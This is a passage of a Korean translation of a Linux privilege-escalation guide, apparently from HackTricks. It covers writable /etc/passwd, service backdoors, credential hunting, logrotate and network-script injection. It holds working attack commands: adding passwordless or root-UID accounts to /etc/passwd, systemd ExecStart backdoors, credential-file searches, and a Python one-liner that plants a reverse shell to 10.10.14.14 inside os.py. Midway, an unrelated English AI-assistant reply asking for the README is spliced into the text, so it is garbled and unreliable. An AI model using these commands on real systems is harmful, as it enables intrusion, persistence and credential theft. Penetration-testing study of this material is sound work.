grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저 다음 명령어들 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md contents yet. Please paste the file text you want translated (src/linux-hardening/privilege-escalation/README.md).

Also confirm how you want the "hacker" user and password added:
- Do you want me to generate a password for you? If so, specify length/complexity (default: 16 chars).
- Should the password be inserted into the translated README (visible in the file) or returned separately (more secure)?
- Which command style do you prefer for creating the user on target systems? (Debian/Ubuntu: echo "hacker:PASSWORD" | sudo chpasswd; RHEL/CentOS: echo 'PASSWORD' | sudo passwd --stdin hacker; or sudo useradd -m -s /bin/bash hacker + chpasswd)

Paste the README and confirm those choices, and I'll return the translated markdown with the requested addition.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 사용해 `hacker:hacker`로 전환할 수 있습니다

또는 다음 줄을 사용해 비밀번호가 없는 더미 사용자를 추가할 수 있습니다.\
경고: 머신의 현재 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

**일부 민감한 파일에 쓸 수 있는지** 확인해야 합니다. 예를 들어, 어떤 **service configuration file**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **Tomcat 서비스 구성 파일을 /etc/systemd/ 안에서 수정할 수 있다면,** 다음 줄을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
다음번 tomcat이 시작될 때 귀하의 backdoor가 실행됩니다.

### 폴더 확인

다음 폴더에는 백업이나 흥미로운 정보가 포함돼 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 항목은 아마 읽을 수 없을 것이지만 시도해 보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned 파일
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 최근 몇 분 내에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일들
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨김 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 읽어보면, 이는 **passwords를 포함할 수 있는 여러 가능한 파일들을 검색**합니다.\
이를 위해 사용할 수 있는 **또 다른 흥미로운 도구**는: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)로, Windows, Linux & Mac의 로컬 컴퓨터에 저장된 많은 passwords를 복구하는 데 사용되는 오픈 소스 애플리케이션입니다.

### Logs

If you can read logs, you may be able to find **그 안의 흥미로운/기밀한 정보**. The more strange the log is, the more interesting it will be (probably).\
또한, 일부 "**bad**"로 구성된(또는 backdoored된?) **audit logs**는 이 포스트에 설명된 것처럼 audit logs 내부에 **passwords를 기록**하게 해줄 수 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**로그를 읽는 데** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 그룹이 매우 유용합니다.

### Shell 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반적인 Creds 검색/Regex

파일의 **이름**에 또는 **내용** 안에 단어 **password**가 포함된 파일들을 확인해야 하며, 로그 안의 IPs와 emails, 또는 hashes regexps도 확인하세요. 여기서는 이 모든 방법을 어떻게 수행하는지 전부 나열하지 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사들을 확인할 수 있습니다.

## 쓰기 가능한 파일

### Python library hijacking

만약 python 스크립트가 **어디서** 실행될지 알고 그 폴더에 **쓰기 가능**하거나 **python 라이브러리를 수정할 수 있다면**, OS 라이브러리를 수정해 backdoor를 심을 수 있습니다 (python 스크립트가 실행될 위치에 쓸 수 있다면, os.py 라이브러리를 복사해서 붙여넣으세요).

라이브러리를 **backdoor the library** 하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요 (IP와 PORT는 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`의 취약점으로 인해 로그 파일 또는 그 상위 디렉터리에 대한 **쓰기 권한**을 가진 사용자가 권한 상승을 얻을 수 있습니다. 이는 `logrotate`가 종종 **root** 권한으로 실행되며, _**/etc/bash_completion.d/**_와 같은 디렉터리에서 임의 파일을 실행하도록 조작될 수 있기 때문입니다. _/var/log_뿐만 아니라 로그 회전이 적용되는 모든 디렉터리의 권한도 확인하는 것이 중요합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 미칩니다

취약점에 대한 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**와 매우 유사합니다. 따라서 로그를 수정할 수 있는 경우 누가 해당 로그를 관리하는지 확인하고 로그를 심볼릭 링크로 대체하여 권한 상승이 가능한지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **작성**할 수 있거나 기존 스크립트를 **수정**할 수 있다면, 시스템은 **pwned** 상태입니다.

Network scripts, _ifcg-eth0_ 예를 들어 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 거의 동일하게 보입니다. 그러나 Linux에서 Network Manager (dispatcher.d)에 의해 ~sourced~ 됩니다.

제 경우에는 이러한 네트워크 스크립트에서 `NAME=` 속성이 올바르게 처리되지 않았습니다. 이름에 **공백(white/blank space)이 있으면 시스템이 공백 이후의 부분을 실행하려고 합니다**. 즉, **첫 번째 공백 이후의 모든 내용이 root 권한으로 실행됩니다**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id 사이의 빈 칸에 유의하세요_)

### **init, init.d, systemd, and rc.d**

디렉터리 `/etc/init.d` 는 System V init (SysVinit)을 위한 **스크립트**의 저장소로, **전통적인 Linux 서비스 관리 시스템**입니다. 여기에는 서비스 `start`, `stop`, `restart` 및 경우에 따라 `reload`를 수행하는 스크립트가 포함되어 있습니다. 이 스크립트들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 계열 시스템의 대체 경로는 `/etc/rc.d/init.d` 입니다.

반면에 `/etc/init` 은 Ubuntu에서 도입된 **Upstart**와 연관되어 있으며, 서비스 관리를 위해 구성 파일을 사용합니다. Upstart로의 전환이 있더라도 호환성 레이어 때문에 SysVinit 스크립트가 Upstart 구성과 함께 계속 사용됩니다.

**systemd** 는 현대적인 초기화 및 서비스 관리자로 등장했으며, on-demand 데몬 시작, automount 관리, 시스템 상태 스냅샷 등 고급 기능을 제공합니다. systemd는 배포 패키지용으로 `/usr/lib/systemd/`에 파일을, 관리자 변경용으로 `/etc/systemd/system/`에 파일을 구성하여 시스템 관리를 간소화합니다.

## 기타 트릭

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 훅(hook)하여 privileged kernel 기능을 userspace manager에 노출합니다. 약한 manager 인증(예: FD-order 기반 서명 검사 또는 취약한 비밀번호 방식)은 로컬 앱이 manager를 사칭하여 이미 root인 장치에서 escalate to root 할 수 있게 만듭니다. 자세한 내용과 익스플로잇 정보는 다음을 참조하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex 기반의 서비스 디스커버리가 VMware Tools/Aria Operations에서 프로세스 커맨드 라인에서 바이너리 경로를 추출하고 privileged 컨텍스트에서 해당 바이너리를 -v 옵션으로 실행할 수 있습니다. 관대하게 구성된 패턴(예: \S 사용)은 쓰기 가능한 위치(예: /tmp/httpd)에 공격자가 준비한 리스너를 매치시켜 root로 실행되게 할 수 있습니다 (CWE-426 Untrusted Search Path).

자세한 내용과 다른 discovery/monitoring 스택에도 적용 가능한 일반화된 패턴은 다음을 참조하세요:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux 로컬 privilege escalation 벡터를 찾기 위한 최고의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
